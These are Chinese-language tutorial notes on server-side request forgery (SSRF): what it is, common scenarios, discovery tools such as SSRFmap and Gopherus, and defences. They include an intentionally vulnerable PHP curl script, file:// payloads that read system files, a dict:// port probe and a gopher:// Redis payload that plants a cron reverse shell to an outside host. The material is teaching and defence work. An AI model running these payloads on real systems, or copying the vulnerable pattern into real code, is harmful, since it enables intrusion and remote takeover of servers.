# 课程大纲 

1. SSRF是什么 
2. SSRF常见场景 
3. 如何发现SSRF漏洞 
4. 如何防御SSRF漏洞

# SSRF是什么

### CURL

```php
<?php
function curl($url){  
    $ch = curl_init();
    // 设置URL和相应的选项
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0); // 启用时会将头文件的信息作为数据流输出  
    // 抓取URL并把它传递给浏览器  
    curl_exec($ch);
    //关闭cURL资源，并且释放系统资源  
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);  
?>
```

访问百度：http://192.168.31.193:8091/ssrf1.php?url=www.baidu.com

访问本地文件：http://192.168.31.193:8091/ssrf1.php?url=file:///c:/windows/win.ini

### php的curl扩展

php.ini

`extension=php_curl.dll`



功能

获取网页资源——爬虫 

webservice——获取接口数据 

FTP——下载文件 

## SSRF 

SSRF (Server-Side Request Forgery) 

服务器端请求伪造

### PHP其他函数

| 函数                | 作用                                    |
| ------------------- | --------------------------------------- |
| curl_exec()         | 执行cURL会话                            |
| file_get_contents() | 将整个文件读入一个字符串                |
| fsockopen()         | 打开一个网络连接或者一个Unix套 接字连接 |

可能引起SSRF漏洞

### CURL其他协议

| 协议   | 作用      | payload                                                      |
| ------ | --------- | ------------------------------------------------------------ |
| file   | 查看文件  | `curl -v 'file:///etc/password'`                             |
| dict   | 探测端口  | http://192.168.31.193:8091/ssrf1.php?url=dict://192.168.31.193:3306 |
| gopher | 反弹shell | `curl -v 'gopher://192.168.31.193:8091/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d% 0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/192.168.142.135/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3% 0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron /%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a $10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$ 4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'` |

### 协议

 dict协议：用于搭建在线字典服务

 gopher协议：是一种信息查找系统，只支持文本，不支持图像，已被HTTP替代

## SSRF定义 

SSRF Server-Side Request Forgery 

服务器端请求伪造：是一种由攻击者构造形成由**服务端**发起请求的一个安全漏洞。

![image-20221125133759679](https://image.201068.xyz/assets/image-20221125133759679.png)

## 危害（利用方式） 

1. 扫描资产 
2. 获取敏感信息 
3. 攻击内网服务器（绕过防火墙） 
4. 访问大文件，造成溢出 
5. 通过Redis写入WebShell或建立反弹连接

# SSRF常见场景

## 社会化分享功能

![image-20221125140125984](https://image.201068.xyz/assets/image-20221125140125984.png)

![image-20221125140133352](https://image.201068.xyz/assets/image-20221125140133352.png)

分享时，解析当前网页的标题等等

## 转码服务

![image-20221125140410419](https://image.201068.xyz/assets/image-20221125140410419.png)

## 在线翻译

![image-20221125140453736](https://image.201068.xyz/assets/image-20221125140453736.png)

## 图片加载、下载功能

![image-20221125140537017](https://image.201068.xyz/assets/image-20221125140537017.png)

## 图片、文章收藏功能

![image-20221125140559729](https://image.201068.xyz/assets/image-20221125140559729.png)

## 网站采集、网站抓取

![image-20221125140646947](https://image.201068.xyz/assets/image-20221125140646947.png)

## 实际案例

1. Wordpress 3.5.1以下版本 xmlrpc.php pingback的缺陷与SSFR 
2. discuz!的SSRF（利用php的header函数来 绕过，其实就是302跳转实现协议转换） 
3. weblogic的SSRF

# 如何发现SSRF漏洞

1. 爬取地址 
2. 查看是否请求了其他资源 

也可以用Google语法搜索关键字： 

share、wap、url、link、src、source、target、u、 3g、display、sourceURL、imageURL、domain

## 工具

### SSRF-Testing

https://github.com/cujanovic/SSRF-Testing 

### Gopherus

https://github.com/tarunkant/Gopherus



1. MySQL (Port-3306)
2. PostgreSQL(Port-5432)
3. FastCGI (Port-9000)
4. Memcached (Port-11211)
5. Redis (Port-6379)
6. Zabbix (Port-10050)
7. SMTP (Port-25)

### SSRFmap

https://github.com/swisskyrepo/SSRFmap

安装

```
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
pip3 install -r requirements.txt
```

使用

```
python3 ssrfmap.py

  usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]
                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]

  optional arguments:
    -h, --help          show this help message and exit
    -r REQFILE          SSRF Request file
    -p PARAM            SSRF Parameter to target
    -m MODULES          SSRF Modules to enable
    -l HANDLER          Start an handler for a reverse shell
    -v [VERBOSE]        Enable verbosity
    --lhost LHOST       LHOST reverse shell
    --lport LPORT       LPORT reverse shell
    --uagent USERAGENT  User Agent to use
    --ssl [SSL]         Use HTTPS without verification
    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)
    --level [LEVEL]     Level of test to perform (1-5, default: 1)
```

# 如何防御SSRF漏洞

## 防御

1. 禁用协议 
2. 限制请求端口 
3. 设置URL白名单 
4. 过滤返回信息 
5. 统一错误信息